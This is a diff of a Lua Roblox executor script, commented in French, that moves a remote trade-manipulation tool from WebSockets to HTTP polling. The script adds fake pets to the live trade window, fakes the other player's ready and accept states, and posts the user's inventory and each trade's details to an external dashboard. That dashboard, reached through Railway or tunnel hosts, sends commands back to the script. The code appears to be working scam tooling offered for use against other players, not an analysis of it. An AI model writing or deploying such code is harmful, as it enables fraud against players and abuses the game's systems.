@@ -308,12 +308,11 @@ local function startTradeCountdown()
 end
 
 -- ========================================================================
--- SYSTEME DE COMMUNICATION WEBSOCKET (BRIDGE NAVIGATEUR)
+-- SYSTEME DE COMMUNICATION HTTP (bypass WebSocket bloques par executor)
 -- ========================================================================
 local HttpService = game:GetService("HttpService")
-local socket = nil
 
-local connectWS = WebSocket and WebSocket.connect or (syn and syn.websocket and syn.websocket.connect)
+local request = syn and syn.request or request or http_request or http and http.request or fluxus and fluxus.request
 
 local function getOfferItems(side)
     local liveTrade = getLiveTradeGui()
@@ -341,14 +340,13 @@ local function getOfferItems(side)
 end
 
 local function sendTradeUpdate()
-    if not socket then return end
+    if not request then return end
     
     local liveTrade = getLiveTradeGui()
     local otherName = "Inconnu"
     if liveTrade then
         local other = liveTrade:FindFirstChild("Other")
         if other then
-            -- 1. Chercher dans Other.Username (ex: "@pmR_sab12's Offer")
             local usernameLabel = other:FindFirstChild("Username")
             if usernameLabel and usernameLabel:IsA("TextLabel") then
                 local text = usernameLabel.Text
@@ -360,7 +358,6 @@ local function sendTradeUpdate()
             end
         end
         
-        -- 2. Fallback sur OtherSign.Username (propre, ex: "@pmR_sab12")
         if otherName == "Inconnu" then
             local otherSign = liveTrade:FindFirstChild("OtherSign")
             if otherSign then
@@ -381,148 +378,145 @@ local function sendTradeUpdate()
     local otherOfferItems = getOfferItems("Other")
     
     pcall(function()
-        socket:Send(HttpService:JSONEncode({
-            type = "trade_update",
-            inTrade = isTradeActive(),
-            otherPlayer = otherName,
-            fakeItemsCount = #fakeItemsList,
-            isYourReady = isYourFakeReady,
-            isOtherReady = isFakeReady,
-            yourOffer = yourOfferItems,
-            otherOffer = otherOfferItems
-        }))
+        request({
+            Url = SERVER_URL .. "/api/trade_update",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                userId = localPlayer.UserId,
+                inTrade = isTradeActive(),
+                otherPlayer = otherName,
+                fakeItemsCount = #fakeItemsList,
+                isYourReady = isYourFakeReady,
+                isOtherReady = isFakeReady,
+                yourOffer = yourOfferItems,
+                otherOffer = otherOfferItems
+            })
+        })
     end)
 end
 
 -- Configuration : change cette URL pour pointer vers ton serveur
--- Railway (bloqué par Cloudflare/executor) : _G.TRADE_SERVER_URL = "wss://web-production-9ec54.up.railway.app"
--- TunnelMole (URL change à chaque redémarrage) : _G.TRADE_SERVER_URL = "ws://ztipie-ip-88-165-174-33.tunnelmole.net"
-local SERVER_URL = (_G.TRADE_SERVER_URL or "ws://ztipie-ip-88-165-174-33.tunnelmole.net")
+-- Railway (bloqué par Cloudflare/executor) : _G.TRADE_SERVER_URL = "https://web-production-9ec54.up.railway.app"
+-- LocalTunnel (renouveler à chaque redémarrage) : _G.TRADE_SERVER_URL = "https://sour-needles-end.loca.lt"
+-- TunnelMole : _G.TRADE_SERVER_URL = "http://ztipie-ip-88-165-174-33.tunnelmole.net"
+-- PAR DEFAUT : localhost (toujours compatible)
+local SERVER_URL = (_G.TRADE_SERVER_URL or "http://localhost:3000")
 
-local function connectToDashboard()
-    if not connectWS then
-        warn("[WEBSOCKET] Votre exécuteur ne supporte pas les WebSockets.")
-        return
+local function registerToServer()
+    if not request then
+        warn("[HTTP] Ton executor ne supporte pas les requêtes HTTP.")
+        return false
     end
     
-    local urlsToTry = {SERVER_URL}
-    -- Fallback sur localhost si Railway ne marche pas
-    if SERVER_URL ~= "ws://localhost:3000" then
-        table.insert(urlsToTry, "ws://localhost:3000")
-    end
-    
-    for _, baseUrl in ipairs(urlsToTry) do
-        local clientId = tostring(localPlayer.UserId)
-        local wsUrl = baseUrl .. "/roblox?type=roblox&clientId=" .. clientId
-        
-        local success, ws = pcall(function()
-            return connectWS(wsUrl)
-        end)
-        
-        if success and ws then
-            socket = ws
-            break
-        else
-            warn("[WEBSOCKET] Échec connexion à " .. baseUrl .. " : " .. tostring(ws))
-        end
-    end
-    
-    if not socket then
-        warn("[WEBSOCKET] Toutes les tentatives de connexion ont échoué. Vérifie que le serveur est lancé (node server.js) ou que l'URL Railway est accessible.")
-        task.wait(10)
-        connectToDashboard()
-        return
-    end
-    
-    -- WebSocket connecté
-    
-    pcall(function()
-        socket:Send(HttpService:JSONEncode({
-            type = "init",
-            username = localPlayer.Name,
-            displayName = localPlayer.DisplayName,
-            userId = localPlayer.UserId,
-            placeId = tostring(game.PlaceId),
-            animalsList = allAnimalsList,
-            inTrade = isTradeActive(),
-            otherPlayer = nil,
-            fakeItemsCount = 0
-        }))
+    local success = pcall(function()
+        request({
+            Url = SERVER_URL .. "/api/register",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                userId = localPlayer.UserId,
+                username = localPlayer.Name,
+                displayName = localPlayer.DisplayName,
+                placeId = tostring(game.PlaceId),
+                animalsList = allAnimalsList,
+                inTrade = isTradeActive(),
+                otherPlayer = nil,
+                fakeItemsCount = 0
+            })
+        })
     end)
     
-    socket.OnMessage:Connect(function(message)
-        local ok, data = pcall(function() return HttpService:JSONDecode(message) end)
-        if not ok or not data then return end
-        
-        -- Commande reçue
-        
-        if data.action == "add_fake_pet" then
-            local petName = data.petName
-            local petMutation = data.petMutation
-            local successAdd = simulateAddBrainrot(petName, petMutation)
-            if successAdd then
-                _G.lastFakeAddTimestamp = os.clock()
-                startTradeCountdown()
-            end
-            sendTradeUpdate()
-            
-        elseif data.action == "set_sign_text" then
-            simulateAddPancarteText(data.text)
-            sendTradeUpdate()
-            
-        elseif data.action == "toggle_other_ready" then
-            isFakeReady = data.state
-            simulateReady(isFakeReady)
-            sendTradeUpdate()
-            
-        elseif data.action == "toggle_my_ready" then
-            isYourFakeReady = data.state
-            sendTradeUpdate()
-            
-        elseif data.action == "force_accept" then
-            isYourFakeAccepted = true
-            isFakeAccepted = true
-            sendTradeUpdate()
-            
-        elseif data.action == "cancel_trade" then
-            local liveTrade = getLiveTradeGui()
-            local other = liveTrade and liveTrade:FindFirstChild("Other")
-            local cancelBtn = other and other:FindFirstChild("Cancel")
-            if cancelBtn then
-                pcall(function()
-                    cancelBtn.Activated:Fire()
-                    cancelBtn.MouseButton1Click:Fire()
-                end)
-            end
-            resetFakeTradeState()
-            sendTradeUpdate()
-            
-        elseif data.action == "remove_fake_pet" then
-            local petName = data.petName
-            for idx, item in ipairs(fakeItemsList) do
-                if item and (item.Name == "FakeAdd_" .. petName:gsub("%s+", "") or item:FindFirstChild("Spacer") and item.Spacer:FindFirstChild("Title") and item.Spacer.Title.Text == petName) then
-                    pcall(function() item:Destroy() end)
-                    table.remove(fakeItemsList, idx)
-                    break
-                end
-            end
-            sendTradeUpdate()
-            
-        elseif data.action == "reset_trade" then
-            resetFakeTradeState()
-            sendTradeUpdate()
-        end
-    end)
-    
-    socket.OnClose:Connect(function()
-        -- WebSocket déconnecté, reconnexion dans 5s
-        socket = nil
-        task.wait(5)
-        connectToDashboard()
-    end)
+    return success
 end
 
-task.spawn(connectToDashboard)
+local function pollCommands()
+    while true do
+        if request then
+            local success, resp = pcall(function()
+                return request({
+                    Url = SERVER_URL .. "/api/commands?userid=" .. localPlayer.UserId,
+                    Method = "GET"
+                })
+            end)
+            
+            if success and resp and resp.Body then
+                local ok, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
+                if ok and data and data.commands then
+                    for _, cmd in ipairs(data.commands) do
+                        if cmd.action == "add_fake_pet" then
+                            local successAdd = simulateAddBrainrot(cmd.petName, cmd.petMutation)
+                            if successAdd then
+                                _G.lastFakeAddTimestamp = os.clock()
+                                startTradeCountdown()
+                            end
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "set_sign_text" then
+                            simulateAddPancarteText(cmd.text)
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "toggle_other_ready" then
+                            isFakeReady = cmd.state
+                            simulateReady(isFakeReady)
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "toggle_my_ready" then
+                            isYourFakeReady = cmd.state
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "force_accept" then
+                            isYourFakeAccepted = true
+                            isFakeAccepted = true
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "cancel_trade" then
+                            local liveTrade = getLiveTradeGui()
+                            local other = liveTrade and liveTrade:FindFirstChild("Other")
+                            local cancelBtn = other and other:FindFirstChild("Cancel")
+                            if cancelBtn then
+                                pcall(function()
+                                    cancelBtn.Activated:Fire()
+                                    cancelBtn.MouseButton1Click:Fire()
+                                end)
+                            end
+                            resetFakeTradeState()
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "remove_fake_pet" then
+                            local petName = cmd.petName
+                            for idx, item in ipairs(fakeItemsList) do
+                                if item and (item.Name == "FakeAdd_" .. petName:gsub("%s+", "") or item:FindFirstChild("Spacer") and item.Spacer:FindFirstChild("Title") and item.Spacer.Title.Text == petName) then
+                                    pcall(function() item:Destroy() end)
+                                    table.remove(fakeItemsList, idx)
+                                    break
+                                end
+                            end
+                            sendTradeUpdate()
+                            
+                        elseif cmd.action == "reset_trade" then
+                            resetFakeTradeState()
+                            sendTradeUpdate()
+                        end
+                    end
+                end
+            end
+        end
+        task.wait(2)
+    end
+end
+
+-- Lancer la connexion
+if not request then
+    warn("[HTTP] Votre executor ne supporte pas les requêtes HTTP.")
+else
+    local registered = registerToServer()
+    if registered then
+        task.spawn(pollCommands)
+    else
+        warn("[HTTP] Échec de l'enregistrement sur le serveur.")
+    end
+end
 
 -- ========================================================================
 -- SYSTEME DE DETECTION ET RESET AUTOMATIQUE EN FIN DE TRADE
